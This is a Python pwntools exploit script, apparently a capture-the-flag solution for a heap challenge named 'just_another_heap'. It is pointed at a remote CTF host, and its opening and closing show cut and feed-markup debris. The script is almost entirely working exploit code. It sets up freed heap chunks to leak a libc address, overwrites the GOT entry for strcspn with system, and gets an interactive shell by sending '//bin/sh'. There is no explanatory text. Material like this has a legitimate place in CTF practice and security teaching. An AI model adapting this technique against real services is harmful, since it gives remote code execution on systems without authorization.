create(idx, name, size, hide, cont, important, recent): p.recv() p.sendline(str(1)) p.recv() p.sendline(str(idx)) p.recv() p.sendline(name) p.recv() p.sendline(str(size)) p.recv() p.sendline(str(hide)) p.recv() p.sendline(cont) p.recv() p.sendline(important) p.recv() p.sendline(recent) def relive(idx): p.recv() p.sendline(str(2)) p.recv() p.sendline(str(idx)) def change(idx, cont): p.recv() p.sendline(str(4)) p.recv() p.sendline(str(idx)) p.recv() p.sendline(&quot;Y&quot;) p.recv() p.send(cont) def forget(idx): p.recv() p.sendline(str(3)) p.recv() p.sendline(str(idx)) def listing(): p.recv() p.sendline(str(5)) p=remote(&quot;dctf-chall-just-another-heap.westeurope.azurecontainer.io&quot;, 7481) #p=process(&quot;./just_another_heap&quot;) e=ELF(&quot;./just_another_heap&quot;) l=e.libc create(0, &quot;A&quot;*8, 0x20, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;) create(1, &quot;B&quot;*8, 0x410, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;) create(2, &quot;A&quot;*8, 0x20, 0, &quot;1234&quot;, &quot;N&quot;, &quot;N&quot;) forget(0) forget(1) #pause() create(3, &quot;B&quot;*8, 0x410, 6, &quot;&quot;, &quot;N&quot;, &quot;N&quot;) #pause() change(3,&quot;A&quot;*8) relive(3) p.recvuntil(&quot;A&quot;*7+&quot; &quot;) libc_base=u64(p.recv(6).ljust(8,'\x00'))-0x3ebca0 print hex(libc_base) create(4, &quot;C&quot;*8, libc_base, e.got['strcspn'], p64(libc_base+l.sym['system']), &quot;N&quot;, &quot;N&quot;) pause() p.recv() p.sendline(str(1)) p.recv() p.sendline(&quot;//bin/sh\x00&quot;) p.interactive()</summary></entry></feed>